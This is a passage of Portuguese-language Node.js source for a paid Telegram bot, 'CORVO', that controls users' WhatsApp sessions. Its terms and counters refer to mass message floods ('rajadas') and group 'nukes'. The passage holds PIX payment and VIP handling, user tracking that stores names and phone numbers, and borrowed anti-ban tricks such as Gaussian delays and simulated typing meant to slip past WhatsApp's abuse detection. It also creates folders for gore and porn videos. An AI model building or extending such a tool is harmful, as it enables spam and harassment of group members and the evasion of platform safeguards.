    if (fs.existsSync(PAYMENTS_FILE)) pendingPayments = JSON.parse(fs.readFileSync(PAYMENTS_FILE));
    if (fs.existsSync(USAGE_FILE)) userUsage = JSON.parse(fs.readFileSync(USAGE_FILE));
    if (fs.existsSync(VIP_KEYS_FILE)) vipKeys = JSON.parse(fs.readFileSync(VIP_KEYS_FILE));
} catch (e) { logEvent('ERROR', 'Erro ao carregar VIPs/Pagamentos/Uso/Keys.'); }

function saveUsage() {
    try { fs.writeFile(USAGE_FILE, JSON.stringify(userUsage, null, 2), () => { }); } catch (e) { logEvent('ERROR', 'Erro ao salvar Uso.'); }
}

function saveVips() {
    try { fs.writeFile(VIP_FILE, JSON.stringify(vips, null, 2), () => { }); } catch (e) { logEvent('ERROR', 'Erro ao salvar VIPs.'); }
}

function savePayments() {
    try { fs.writeFile(PAYMENTS_FILE, JSON.stringify(pendingPayments, null, 2), () => { }); } catch (e) { logEvent('ERROR', 'Erro ao salvar Pagamentos.'); }
}

function saveVipKeys() {
    try { fs.writeFileSync(VIP_KEYS_FILE, JSON.stringify(vipKeys, null, 2)); } catch (e) { logEvent('ERROR', 'Erro ao salvar VIP Keys.'); }
}

function isUserVip(userId) {
    if (userId === ADMIN_ID) return true;
    const vip = vips[userId];
    if (!vip) return false;
    if (Date.now() > vip.expiresAt) {
        return false;
    }
    return true;
}

function getUserVipType(userId) {
    if (userId === ADMIN_ID) return 'ADMIN/FULL';
    const vip = vips[userId];
    if (!vip) return 'FREE';
    if (Date.now() > vip.expiresAt) return 'FREE';
    if (vip.type === 'trial') return 'VIP TRIAL (1 DIA)';
    return vip.type === 'full' ? 'VIP COMPLETO' : 'VIP PADRÃO';
}

// Função para dar VIP trial de 1 dia para novos usuários
function giveTrialVip(userId) {
    if (userId === ADMIN_ID) return; // Admin não precisa trial
    if (vips[userId]) return; // Já teve VIP antes, não ganha trial novamente
    const oneDayMs = 24 * 60 * 60 * 1000;
    vips[userId] = {
        type: 'trial',
        expiresAt: Date.now() + oneDayMs
    };
    saveVips();
    logEvent('SUCCESS', `VIP Trial de 1 dia concedido para usuário ${userId}`);
}

// Funções API Promisse
const promisseApi = {
    async createPix(amount) {
        try {
            const amountInCents = Math.round(parseFloat(amount) * 100);
            logEvent('INFO', `Tentando gerar PIX no valor de: ${amountInCents} centavos...`);
            const response = await axios.post('https://api.promisse.com.br/transactions', { amount: amountInCents }, {
                headers: { 'Authorization': PROMISSE_API_KEY, 'Content-Type': 'application/json' }
            });
            const pixData = response.data;
            if (pixData && (pixData.pix_code || pixData.copyPaste)) {
                logEvent('SUCCESS', `PIX Gerado com sucesso! ID: ${pixData.id}`);
                if (!pixData.pix_code && pixData.copyPaste) pixData.pix_code = pixData.copyPaste;
                return pixData;
            } else {
                logEvent('ERROR', `Resposta da API sem código PIX: ${JSON.stringify(pixData)}`);
                return null;
            }
        } catch (e) {
            const errorMsg = e.response ? JSON.stringify(e.response.data) : e.message;
            logEvent('ERROR', `Erro Promisse CreatePix: ${errorMsg}`);
            return null;
        }
    },
    async checkTransaction(id) {
        try {
            const response = await axios.get(`https://api.promisse.com.br/transactions/${id}`, {
                headers: { 'Authorization': PROMISSE_API_KEY }
            });
            return response.data;
        } catch (e) { logEvent('ERROR', `Erro Promisse Check: ${e.message}`); return null; }
    },
    async getBalance() {
        try {
            const response = await axios.get('https://api.promisse.com.br/check-balance', {
                headers: { 'Authorization': PROMISSE_API_KEY }
            });
            return response.data;
        } catch (e) { logEvent('ERROR', `Erro Promisse Balance: ${e.message}`); return null; }
    },
    async withdraw(amount, pixKey) {
        try {
            const response = await axios.post('https://api.promisse.com.br/withdrawals', { amount: Math.round(amount * 100), pixKey }, {
                headers: { 'Authorization': PROMISSE_API_KEY, 'Content-Type': 'application/json' }
            });
            return response.data;
        } catch (e) { logEvent('ERROR', `Erro Promisse Withdraw: ${e.message}`); return null; }
    }
};

setInterval(async () => {
    for (const id in pendingPayments) {
        const pay = pendingPayments[id];
        if (Date.now() > pay.expiresAt) {
            delete pendingPayments[id];
            savePayments();
            continue;
        }
        const res = await promisseApi.checkTransaction(id);
        const status = res?.status?.toLowerCase();
        if (res && (status === 'paid' || status === 'completed' || status === 'success')) {
            logEvent('SUCCESS', `Pagamento Detectado! ID: ${id} | Usuário: ${pay.userId} | Valor: ${pay.amount}`);
            const userId = pay.userId;
            if (pay.type.startsWith('vip_')) {
                const days = parseInt(pay.type.split('_')[1].replace('d', ''));
                const expiration = Date.now() + (days * 24 * 60 * 60 * 1000);
                vips[userId] = { type: 'full', expiresAt: expiration };
                saveVips();
                bot.telegram.sendMessage(userId, `✅ *PAGAMENTO CONFIRMADO!*

Seu acesso *VIP* foi ativado com sucesso por ${days} dia(s)!`, { parse_mode: 'Markdown' }).catch(() => { });
                bot.telegram.sendMessage(ADMIN_ID, `💰 *NOVO VIP ATIVADO*
👤 Usuário: \`${userId}\`
💎 Plano: ${pay.type.toUpperCase()}
💵 Valor: R$ ${(pay.amount / 100).toFixed(2)}`, { parse_mode: 'Markdown' }).catch(() => { });

                // Postar no canal sobre novo VIP
                try {
                    const userIdMasked = String(userId).slice(0, 3) + '****' + String(userId).slice(-3);
                    const planoNome = days === 1 ? 'Diario' : days === 3 ? '3 Dias' : days === 7 ? 'Semanal' : days === 15 ? '15 Dias' : 'Mensal';
                    const dataValidade = new Date(expiration).toLocaleString('pt-BR', {
                        day: '2-digit',
                        month: '2-digit',
                        year: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    });
                    const canalMsg = `🎉 *NOVO CLIENTE VIP* 🎉

🆔 ID: ${userIdMasked}
💸 Valor: R$ ${(pay.amount / 100).toFixed(2).replace('.', ',')}
📲 Plano: ${planoNome}
📅 Validade: ${dataValidade}

✅ Acesso liberado automaticamente`;
                    await bot.telegram.sendMessage(CHANNEL_ID, canalMsg, {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('💎 COMPRAR ACESSO 💎', 'show_vip_plans_channel')]
                        ])
                    });
                } catch (e) {
                    logEvent('ERROR', `Erro ao postar VIP no canal: ${e.message}`);
                }
            } else if (pay.type === 'donation') {
                bot.telegram.sendMessage(userId, `💖 *DOAÇÃO RECEBIDA!*

Muito obrigado por apoiar o projeto DO CORVO! Sua ajuda é fundamental.`, { parse_mode: 'Markdown' }).catch(() => { });
                bot.telegram.sendMessage(ADMIN_ID, `🎁 *NOVA DOAÇÃO RECEBIDA*
👤 Usuário: \`${userId}\`
💵 Valor: R$ ${(pay.amount / 100).toFixed(2)}`, { parse_mode: 'Markdown' }).catch(() => { });
            }
            delete pendingPayments[id];
            savePayments();
        }
    }
}, 30000);

const bot = new Telegraf(TELEGRAM_TOKEN);
const logger = pino({ level: 'silent' });

// --- INTERCEPTAÇÃO GLOBAL PARA FORMATAÇÃO EM BLOCKQUOTE E RASTREIO ---
const originalCallApi = bot.telegram.callApi.bind(bot.telegram);
bot.telegram.callApi = async function (method, payload, options) {
    // Interceptar envio e edição de textos/legendas
    if (['sendMessage', 'editMessageText', 'editMessageCaption', 'sendPhoto', 'sendVideo', 'sendAnimation', 'sendDocument'].includes(method) && payload) {

        let textProp = ['sendMessage', 'editMessageText'].includes(method) ? 'text' : 'caption';

        if (payload[textProp] && typeof payload[textProp] === 'string') {
            let text = payload[textProp];
            let parseMode = payload.parse_mode;

            // Converter * e _ do Markdown antigo para tags HTML
            if (!parseMode || parseMode === 'Markdown') {
                text = text.replace(/\*(.*?)\*/g, '<b>$1</b>')
                    .replace(/_(.*?)_/g, '<i>$1</i>')
                    .replace(/`(.*?)`/g, '<code>$1</code>');
            }

            // Se ainda não tem blockquote, adiciona
            if (!text.includes('<blockquote>') && text.trim().length > 0) {
                text = `<blockquote>${text.trim()}</blockquote>`;
            }

            payload[textProp] = text;
            payload.parse_mode = 'HTML';
        }
    }

    // Processar a requisição original
    const response = await originalCallApi(method, payload, options);

    // Rastreio automático de mensagens enviadas pelo bot
    if (['sendMessage', 'sendPhoto', 'sendVideo', 'sendAnimation', 'sendDocument', 'copyMessage', 'forwardMessage'].includes(method) && response && response.message_id) {
        const chatId = payload.chat_id || (response.chat && response.chat.id);
        if (chatId) {
            trackBotMessage(chatId, response.message_id);

        }
    }

    return response;
};

// --- MOTOR DE NAVEGAÇÃO OTIMIZADO ---
const originalHears = bot.hears.bind(bot);
const registeredActions = new Set();

bot.hears = function (triggers, handler) {
    originalHears(triggers, handler);

    // Registra a ação apenas se ainda não foi registrada para evitar duplicatas
    if (!registeredActions.has(triggers)) {
        bot.action(triggers, async (ctx) => {
            try { await ctx.answerCbQuery().catch(() => { }); } catch (e) { }
            // Apenas apaga a mensagem se for explicitamente um menu de navegação
            if (ctx.callbackQuery?.message && (triggers.toString().includes('Menu') || triggers.toString().includes('Voltar'))) {
                bot.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id).catch(() => { });
            }
            return handler(ctx);
        });
        registeredActions.add(triggers);
    }
};

const originalKeyboard = Markup.keyboard;
// Ajuste para não forçar inline keyboard em tudo, permitindo flexibilidade
Markup.keyboard = function (buttons) {
    return originalKeyboard(buttons).resize();
};

// Wrapper para bot.telegram.sendMessage com rastreamento automático (SEM auto-delete)
const originalSendMessage = bot.telegram.sendMessage.bind(bot.telegram);
bot.telegram.sendMessage = async function (chatId, text, options) {
    const sentMsg = await originalSendMessage(chatId, text, options);
    if (sentMsg?.message_id && chatId) {
        // Rastreia a mensagem (SEM auto-delete, deixa cleanupAfterReply cuidar)
        trackBotMessage(chatId, sentMsg.message_id);
    }
    return sentMsg;
};

// Função auxiliar para processar comandos de botão
// Rastreia a mensagem do usuário mas NÃO limpa ainda
async function handleButtonCommand(ctx, tid) {
    // Rastreia mensagem do usuário
    if (ctx.message?.message_id) {
        trackUserMessage(tid, ctx.message.message_id);
    }
    // NÃO limpa aqui - deixa para limpar DEPOIS de processar
}

// Função para limpar mensagens antigas DEPOIS de enviar resposta
async function cleanupAfterReply(ctx, tid, newMessageId) {
    // A mensagem já foi rastreada pelo middleware automático
    // Agora apenas limpa as mensagens antigas (exceto a nova)
    const history = userMessageHistory[tid];
    if (history) {
        const chatId = ctx.chat?.id || ctx.from?.id;
        const deletePromises = [];
        // Deleta mensagens antigas do bot (exceto a nova)
        if (history.bot && history.bot.length > 0) {
            for (const msgId of history.bot) {
                if (msgId !== newMessageId) {
                    deletePromises.push(
                        bot.telegram.deleteMessage(chatId, msgId).catch(() => { })
                    );
                }
            }
        }
        // Deleta mensagens antigas do usuário
        if (history.user && history.user.length > 0) {
            for (const msgId of history.user) {
                deletePromises.push(
                    bot.telegram.deleteMessage(chatId, msgId).catch(() => { })
                );
            }
        }
        await Promise.all(deletePromises);
        // Limpa os arrays mas mantém a nova mensagem
        userMessageHistory[tid] = {
            bot: newMessageId ? [newMessageId] : [],
            user: []
        };
    }
}

// Wrapper para ctx.reply que rastreia automaticamente
async function trackedReply(ctx, text, options = {}) {
    const tid = ctx.from?.id;
    const sentMsg = await ctx.reply(text, options).catch(() => null);
    if (sentMsg?.message_id && tid) {
        trackBotMessage(tid, sentMsg.message_id);
    }
    return sentMsg;
}

// Funções de rastreamento movidas para o topo para evitar erros de hoisting.

// Função clearUserMessages movida para o topo.

// Função helper para deletar mensagens com verificação
async function safeDeleteMessage(ctx, messageId, delayMs = 0) {
    if (!ctx || !messageId) return;
    const chatId = ctx.chat?.id || ctx.from?.id;
    if (!chatId) return;
    try {
        if (delayMs > 0) {
            setTimeout(() => {
                bot.telegram.deleteMessage(chatId, messageId).catch(() => { });
            }, delayMs);
        } else {
            await bot.telegram.deleteMessage(chatId, messageId).catch(() => { });
        }
    } catch (e) {
        // Silenciosamente ignora erros de deleção
    }
}

// Função helper para responder e deletar automaticamente após delay
async function replyAndDelete(ctx, text, options = {}, deleteDelay = 8000, deleteUserMsg = false) {
    try {
        const tid = ctx.from?.id;

        // Limpa TODAS as mensagens antigas primeiro
        if (tid) {
            await clearUserMessages(ctx, tid);
        }

        // Rastreia a mensagem do usuário para deletar depois
        if (ctx.message?.message_id && tid) {
            trackUserMessage(tid, ctx.message.message_id);
            // Deleta a mensagem do usuário após um pequeno delay se solicitado
            if (deleteUserMsg) {
                safeDeleteMessage(ctx, ctx.message.message_id, 1000);
            }
        }

        // Envia a resposta
        const sentMsg = await ctx.reply(text, options);

        // Rastreia mensagem do bot
        if (sentMsg?.message_id && tid) {
            trackBotMessage(tid, sentMsg.message_id);
        }

        // Agenda deleção da resposta do bot se necessário
        if (sentMsg?.message_id && deleteDelay > 0) {
            safeDeleteMessage(ctx, sentMsg.message_id, deleteDelay);
        }

        return sentMsg;
    } catch (e) {
        // Silenciosamente ignora erros
        return null;
    }
}

const userSessions = {};
const userConfigs = {};
const userStates = {};
const pairingInProgress = {};
const connectionTimers = {};
const userTrackerIds = {};
const floodMap = new Map(); // Sistema Anti-Flood
const bannedUsers = new Set(); // Sistema de Banimento
// ============================================================
// 🚀 SISTEMAS DO GITHUB — TOP PROJETOS BAILEYS
// ============================================================

// ---- [1] GAUSSIAN JITTER (kobie3717/baileys-antiban) ----
// Delays humanos com distribuição Gaussiana em vez de fixos
function gaussianJitter(baseMs, stdDevMs = 0) {
    stdDevMs = stdDevMs || baseMs * 0.25; // desvio padrão = 25% do base
    let u = 0, v = 0;
    while (u === 0) u = Math.random();
    while (v === 0) v = Math.random();
    const n = Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
    const result = Math.round(baseMs + n * stdDevMs);
    return Math.max(100, result); // mínimo 100ms
}

// ---- [2] EXPONENTIAL BACKOFF CLASSIFICADO ----
// Baseado em baileys-antiban classifyDisconnect
function classifyDisconnect(statusCode) {
    const codes = {
        401: { cat: 'fatal',       reconnect: false, backoffMs: 0,      msg: 'Deslogado (401)' },
        403: { cat: 'fatal',       reconnect: false, backoffMs: 0,      msg: 'Acesso negado (403)' },
        408: { cat: 'recoverable', reconnect: true,  backoffMs: 5000,   msg: 'Timeout (408)' },
        428: { cat: 'recoverable', reconnect: true,  backoffMs: 3000,   msg: 'Conexão substituída (428)' },
        429: { cat: 'rate-limit',  reconnect: true,  backoffMs: 60000,  msg: 'Rate limit (429) — aguardando 60s' },
        440: { cat: 'fatal',       reconnect: false, backoffMs: 0,      msg: 'Deslogado (440)' },
        500: { cat: 'recoverable', reconnect: true,  backoffMs: 10000,  msg: 'Erro interno WA (500)' },
        503: { cat: 'recoverable', reconnect: true,  backoffMs: 15000,  msg: 'Serviço indisponível (503)' },
        515: { cat: 'recoverable', reconnect: true,  backoffMs: 1000,   msg: 'Reinicio obrigatório (515)' },
    };
    return codes[statusCode] || { cat: 'unknown', reconnect: true, backoffMs: 5000, msg: `Código desconhecido (${statusCode})` };
}

// ---- [3] GROUP METADATA CACHE (cachedGroupMetadata) ----
// Evita fetch repetido de participantes (principal causa de rate-limit)
const groupMetadataCache = new Map();
const GROUP_CACHE_TTL = 5 * 60 * 1000; // 5 minutos

async function getCachedGroupMetadata(sock, jid) {
    const cached = groupMetadataCache.get(jid);
    if (cached && (Date.now() - cached.ts) < GROUP_CACHE_TTL) {
        return cached.data;
    }
    try {
        const data = await sock.groupMetadata(jid);
        groupMetadataCache.set(jid, { data, ts: Date.now() });
        return data;
    } catch (e) {
        return cached?.data || null;
    }
}

function invalidateGroupCache(jid) {
    groupMetadataCache.delete(jid);
}

// ---- [4] TYPING SIMULATION (PresenceChoreographer) ----
// Simula digitação humana antes de enviar mensagem WA
async function simulateTyping(sock, jid, textLength = 50) {
    if (!sock?.user) return;
    const WPM = 40 + Math.random() * 20; // 40-60 WPM
    const charsPerMs = (WPM * 5) / 60000;
    const typingMs = Math.min(textLength / charsPerMs, 8000); // máx 8s
    try {
        await sock.sendPresenceUpdate('composing', jid);
        await new Promise(r => setTimeout(r, gaussianJitter(typingMs, typingMs * 0.15)));
        await sock.sendPresenceUpdate('paused', jid);
        await new Promise(r => setTimeout(r, gaussianJitter(300, 100)));
    } catch (e) { }
}

// ---- [5] SESSION HEALTH MONITOR ----
// Detecta Bad MAC errors antes de causar ban
const sessionHealthMonitor = {};

function getSessionHealth(tid) {
    if (!sessionHealthMonitor[tid]) {
        sessionHealthMonitor[tid] = {
            badMacCount: 0,
            decryptSuccess: 0,
            lastReset: Date.now(),
            isDegraded: false
        };
    }
    return sessionHealthMonitor[tid];
}

function recordDecryptSuccess(tid) {
    const h = getSessionHealth(tid);
    h.decryptSuccess++;
    // Reset janela a cada 60s
    if (Date.now() - h.lastReset > 60000) {
        h.badMacCount = 0;
        h.decryptSuccess = 0;
        h.lastReset = Date.now();
        h.isDegraded = false;
    }
}

function recordBadMac(tid) {
    const h = getSessionHealth(tid);
    h.badMacCount++;
    if (h.badMacCount >= 3 && !h.isDegraded) {
        h.isDegraded = true;
        logEvent('WARN', `🟡 [HEALTH] Sessão ${tid} degradada: ${h.badMacCount} Bad MACs em 60s`);
        bot.telegram.sendMessage(tid,
            `⚠️ *ALERTA DE SESSÃO*\n\nSua conexão WhatsApp está instável (*Bad MAC*).\nRecomendamos desconectar e reconectar para evitar ban.`,
            { parse_mode: 'Markdown' }
        ).catch(() => {});
    }
}
const activeTasks = new Set();
const MAX_SIMULTANEOUS_USERS = 5;
const connectionLocks = new Set(); // FIX Bug #3: evitar duplo socket
const whatsappMessageCache = new Map(); // Cache de mensagens do WhatsApp para Anti-Delete

function canStartTask(tid) {
    if (isUserVip(tid)) return true;
    if (activeTasks.has(tid)) return true;
    return activeTasks.size < MAX_SIMULTANEOUS_USERS;
}

function startTask(tid) {
    activeTasks.add(tid);
}

function endTask(tid) {
    activeTasks.delete(tid);
}

// --- BATCH SAVE SYSTEM (FIX Bug #4: evitar I/O excessivo no loop) ---
let _pendingStatsSave = false;
let _pendingUsersDataSave = false;

function scheduleStatsSave() {
    if (!_pendingStatsSave) {
        _pendingStatsSave = true;
        setTimeout(() => { saveStats(); _pendingStatsSave = false; }, 5000);
    }
}

function scheduleUsersDataSave() {
    if (!_pendingUsersDataSave) {
        _pendingUsersDataSave = true;
        setTimeout(() => { saveUsersData(); _pendingUsersDataSave = false; }, 5000);
    }
}

// --- UTILITÁRIO: truncar texto longo para Telegram (FIX S4) ---
function safeTelegramText(text, max = 4000) {
    if (!text) return '';
    if (text.length <= max) return text;
    return text.substring(0, max - 50) + '\n\n<i>... (truncado)</i>';
}

// --- BACKUP AUTOMÁTICO (Feature F3) ---
function runAutoBackup() {
    try {
        const backupDir = './backups';
        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
        const ts = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
        const backupPath = `${backupDir}/backup_${ts}`;
        fs.mkdirSync(backupPath, { recursive: true });
        const filesToBackup = ['./data/vips.json', './data/users.json', './data/users_data.json', './data/stats.json', './data/banned.json'];
        filesToBackup.forEach(f => {
            if (fs.existsSync(f)) fs.copyFileSync(f, `${backupPath}/${path.basename(f)}`);
        });
        // Manter apenas últimos 10 backups
        const allBackups = fs.readdirSync(backupDir).filter(d => d.startsWith('backup_')).sort();
        if (allBackups.length > 10) {
            allBackups.slice(0, allBackups.length - 10).forEach(d => {
                fs.rmSync(`${backupDir}/${d}`, { recursive: true, force: true });
            });
        }
        logEvent('SUCCESS', `Backup automático criado: backup_${ts}`);
    } catch (e) {
        logEvent('ERROR', `Erro no backup automático: ${e.message}`);
    }
}
setInterval(runAutoBackup, 6 * 60 * 60 * 1000); // A cada 6 horas

const THREE_HOURS = 3 * 60 * 60 * 1000;

// Links Oficiais
const OFFICIAL_SITES = {
    site1: '',
    site2: '',
    admin: 'https://t.me/CORVO291'
};

// Canais Obrigatórios da Equipe CORVO DIV
const MANDATORY_CHANNELS = [
    '120363406750213266@newsletter'
];


// Pastas e Persistência
['./sessions', './configs', './data', './videos/gore', './videos/porno'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

const USERS_FILE = './data/users.json';
const USERS_DATA_FILE = './data/users_data.json'; // Novo arquivo com dados completos
const BANNED_FILE = './data/banned.json';
const ACCEPTED_TERMS_FILE = './data/accepted_terms.json';
const STATS_FILE = './data/stats.json';
const SUPPORT_FILE = './data/support.json';
const VERSION_FILE = './version.json';
const LAST_VERSION_FILE = './data/last_version.json';
const CODE_HASH_FILE = './data/code_hash.json';
const GROUP_LINKS_FILE = './data/group_links.json';

let totalUsers = new Set();
let usersData = {}; // Objeto para guardar dados completos: { id: { name, username, phone } }
let acceptedTermsUsers = new Set();
let supportFeedbacks = [];
let globalStats = {
    nukedGroups: 0,
    rajarGroups: 0,
    messagesSent: 0
};

// Extensão de usersData para incluir estatísticas (usa batch save - FIX Bug #4)
function updateUserStats(tid, type, amount = 1) {
    if (!usersData[tid]) usersData[tid] = {};
    if (!usersData[tid].stats) usersData[tid].stats = { messagesSent: 0, groupsRajados: 0, nukes: 0 };

    if (type === 'message') usersData[tid].stats.messagesSent += amount;
    if (type === 'group') usersData[tid].stats.groupsRajados += amount;
    if (type === 'nuke') usersData[tid].stats.nukes += amount;

    scheduleUsersDataSave(); // Batch save: evita I/O excessivo
}

// Carregar Dados Salvos
try {
    if (fs.existsSync(USERS_FILE)) {
        totalUsers = new Set(JSON.parse(fs.readFileSync(USERS_FILE)));
    }
    if (fs.existsSync(USERS_DATA_FILE)) {
        usersData = JSON.parse(fs.readFileSync(USERS_DATA_FILE));
    }
    if (fs.existsSync(BANNED_FILE)) {
        const banned = JSON.parse(fs.readFileSync(BANNED_FILE));
        banned.forEach(id => bannedUsers.add(id));
    }
    if (fs.existsSync(ACCEPTED_TERMS_FILE)) {
        const accepted = JSON.parse(fs.readFileSync(ACCEPTED_TERMS_FILE));
        accepted.forEach(id => acceptedTermsUsers.add(id));
    }
    if (fs.existsSync(STATS_FILE)) {
        const savedStats = JSON.parse(fs.readFileSync(STATS_FILE));
        globalStats = { ...globalStats, ...savedStats };
    } else {
        fs.writeFileSync(STATS_FILE, JSON.stringify(globalStats, null, 2));
    }
    if (fs.existsSync(SUPPORT_FILE)) {
        supportFeedbacks = JSON.parse(fs.readFileSync(SUPPORT_FILE));
    }
} catch (e) { logEvent('ERROR', 'Erro ao carregar arquivos de dados.'); }

function saveUsersData() {
    try {
        fs.writeFile(USERS_DATA_FILE, JSON.stringify(usersData, null, 2), () => { });
    } catch (e) { logEvent('ERROR', 'Erro ao salvar dados dos usuários.'); }
}

function saveSupport() {
    try {
        fs.writeFile(SUPPORT_FILE, JSON.stringify(supportFeedbacks, null, 2), () => { });
    } catch (e) { logEvent('ERROR', 'Erro ao salvar feedbacks de suporte.'); }
}

function saveStats() {
    try {
        fs.writeFile(STATS_FILE, JSON.stringify(globalStats, null, 2), () => { });
    } catch (e) { logEvent('ERROR', 'Erro ao salvar estatísticas.'); }
}

let groupLinksCache = {};
try {
    if (fs.existsSync(GROUP_LINKS_FILE)) {
        groupLinksCache = JSON.parse(fs.readFileSync(GROUP_LINKS_FILE, 'utf-8'));
    }
} catch (e) { }

function saveGroupLink(jid, link) {
    groupLinksCache[jid] = link;
    try {
        fs.writeFileSync(GROUP_LINKS_FILE, JSON.stringify(groupLinksCache, null, 2));
    } catch (e) { }
}

function getGroupLink(jid) {
    return groupLinksCache[jid] || null;
}

function saveAcceptedTerms(tid) {
    acceptedTermsUsers.add(tid);
    fs.writeFile(ACCEPTED_TERMS_FILE, JSON.stringify(Array.from(acceptedTermsUsers)), () => { });
}

const TERMS_OF_USE = `*TERMOS DE USO E POLÍTICA DE PRIVACIDADE - CORVO BOT*\n\n
Ao utilizar o bot CORVO, você concorda integralmente com os seguintes termos e condições. Por favor, leia atentamente antes de prosseguir.\n\n*1. Aceitação dos Termos*\n Ao iniciar e utilizar qualquer funcionalidade deste bot, você declara ter lido, compreendido e aceito estes Termos de Uso. Caso não concorde com qualquer parte destes termos, você não deve utilizar o bot.\n\n*2. Natureza do Serviço*\n O CORVO DIV é uma ferramenta automatizada desenvolvida para auxiliar em diversas interações no WhatsApp, incluindo, mas não se limitando a, envio de mensagens em massa (rajadas) e gerenciamento de grupos (nuke).\n\n*3. Riscos e Responsabilidades do Usuário*\n *3.1. Banimento do WhatsApp:* O uso de ferramentas automatizadas, como este bot, para interações em massa ou comportamentos que violem as políticas de uso do WhatsApp pode resultar no *banimento temporário ou permanente* do seu número de telefone. O CORVO DIV não se responsabiliza por quaisquer banimentos ou restrições impostas pelo WhatsApp ao seu número.\n *3.2. Uso Abusivo:* Qualquer uso considerado abusivo, ilegal, antiético ou que cause danos a terceiros é de *total responsabilidade do usuário*. Isso inclui, mas não se limita a, envio de spam, phishing, disseminação de conteúdo malicioso, assédio ou qualquer atividade que infrinja leis locais e internacionais.\n *3.3. Conteúdo das Mensagens:* O conteúdo das mensagens enviadas através do bot é de *exclusiva responsabilidade do usuário*. O bot atua apenas como uma ferramenta para transmissão do conteúdo fornecido pelo usuário.\n *3.4. Segurança da Conta:* A segurança da sua conta do WhatsApp e das informações de login utilizadas para conectar ao bot é de *responsabilidade do usuário*. Recomenda-se cautela ao compartilhar suas credenciais.\n\n*4. Isenção de Responsabilidade do Desenvolvedor*\n *4.1. Sem Garantias:* O bot é fornecido "como está", sem garantias de qualquer tipo, expressas ou implícitas. O desenvolvedor não garante que o bot será ininterrupto, livre de erros ou que atenderá a todas as suas expectativas.\n *4.2. Limitação de Responsabilidade:* Em nenhuma circunstância o desenvolvedor do CORVO DIV será responsável por quaisquer danos diretos, indiretos, incidentais, especiais, consequenciais ou punitivos, incluindo, mas não se limitando a, perda de lucros, dados, uso, boa vontade ou outras perdas intangíveis, resultantes do seu acesso ou uso, ou incapacidade de acessar ou usar o bot.\n *4.3. Alterações no Serviço:* O desenvolvedor reserva-se o direito de modificar ou descontinuar, temporária ou permanentemente, o bot (ou qualquer parte dele) com ou sem aviso prévio.\n\n*5. Privacidade*\n *5.1. Coleta de Dados:* O bot pode coletar dados de uso para fins de melhoria do serviço e estatísticas internas (ex: número de usuários, grupos rajados). Dados pessoais sensíveis não são armazenados sem consentimento explícito.\n *5.2. Dados de Sessão:* As informações de sessão do WhatsApp são armazenadas localmente para permitir a reconexão. O desenvolvedor não acessa ou compartilha essas informações.\n\n*6. Disposições Gerais*\n *6.1. Alterações nos Termos:* Estes Termos de Uso podem ser atualizados periodicamente. É responsabilidade do usuário revisar a versão mais recente.\n *6.2. Lei Aplicável:* Estes termos serão regidos e interpretados de acordo com as leis do Brasil, independentemente de conflitos de princípios legais.\n\nAo clicar em "Aceitar Termos", você confirma que leu e concorda com todas as cláusulas acima. Seus dados de aceitação serão registrados para fins de conformidade.`;

function trackUser(tid, ctx = null) {
    if (!totalUsers.has(tid)) {
        totalUsers.add(tid);
        fs.writeFile(USERS_FILE, JSON.stringify(Array.from(totalUsers)), () => { });
        // Dar VIP trial desativado para obrigar a compra
        // giveTrialVip(tid);
        showDashboard();
    }

    // Sempre inicializa usersData se não existir
    if (!usersData[tid]) {
        usersData[tid] = {
            name: 'Desconhecido',
            username: null,
            phone: 'N/A',
            lastSeen: Date.now()
        };
    }

    // Sempre atualizar dados do usuário quando houver contexto
    if (ctx && ctx.from) {
        // Atualiza nome do Telegram
        if (ctx.from.first_name) {
            usersData[tid].name = ctx.from.first_name;
            if (ctx.from.last_name) {
                usersData[tid].name += ' ' + ctx.from.last_name;
            }
        }

        // Atualiza username
        if (ctx.from.username) {
            usersData[tid].username = ctx.from.username;
        }

        // Atualiza lastSeen
        usersData[tid].lastSeen = Date.now();

        // Rastrear mensagem do usuário para limpeza automática
        if (ctx.message && ctx.message.message_id) {
            trackUserMessage(tid, ctx.message.message_id);
        }

        saveUsersData();
    }

    // Tenta atualizar telefone do WhatsApp se estiver conectado
    updateUserPhone(tid);
}

// Função para atualizar telefone do WhatsApp quando conectar
function updateUserPhone(tid) {
    const waPhone = userSessions[tid]?.user?.id ? userSessions[tid].user.id.split(':')[0] : null;
    if (waPhone) {
        // Inicializa usersData se não existir
        if (!usersData[tid]) {
            usersData[tid] = {
                name: 'Desconhecido',
                username: null,
                phone: 'N/A',
                lastSeen: Date.now()
            };
        }
        // Atualiza o telefone
        usersData[tid].phone = waPhone;
        saveUsersData();
        logEvent('INFO', `Telefone atualizado para usuário ${tid}: ${waPhone}`);
    }
}

// Função para sincronizar dados de todos os usuários registrados
// Cria entrada básica para usuários que existem no totalUsers mas não têm usersData
function syncUsersData() {
    let synced = 0;
    for (const uid of totalUsers) {
        if (!usersData[uid]) {
            usersData[uid] = {
                name: 'Desconhecido',
                username: null,
                phone: 'N/A',
                lastSeen: 0,
                needsSync: true // Flag para indicar que precisa atualizar dados
            };
            synced++;
        }
    }
    if (synced > 0) {
        saveUsersData();
        logEvent('INFO', `Sincronizados ${synced} usuários sem dados`);
    }
}

// Executar sincronização na inicialização
syncUsersData();

// --- SISTEMA DE AUTO-CLEANING (LIMPEZA AUTOMÁTICA) ---
setInterval(() => {
    logEvent('INFO', 'Iniciando limpeza automática de cache e sessões temporárias...');
    const now = Date.now();
    // Limpar flood map antigo
    for (const [tid, data] of floodMap.entries()) {
        if (now - data.last > 10000) floodMap.delete(tid);
    }
    try {
        const sessions = fs.readdirSync('./sessions');
        sessions.forEach(dir => {
            const p = path.join('./sessions', dir);
            if (fs.statSync(p).isDirectory()) {
                if (!fs.existsSync(path.join(p, 'creds.json'))) {
                    fs.rmSync(p, { recursive: true, force: true });
                }
            }
        });
    } catch (e) { }
}, 15 * 60 * 1000); // A cada 15 minutos

// --- MIDDLEWARE ÚNICO DE RASTREAMENTO (FIX Bug #6: consolidado, sem duplicação) ---
bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const tid = ctx.from.id;

    // Patch ctx.reply (uma única vez aqui)
    const _origReply = ctx.reply.bind(ctx);
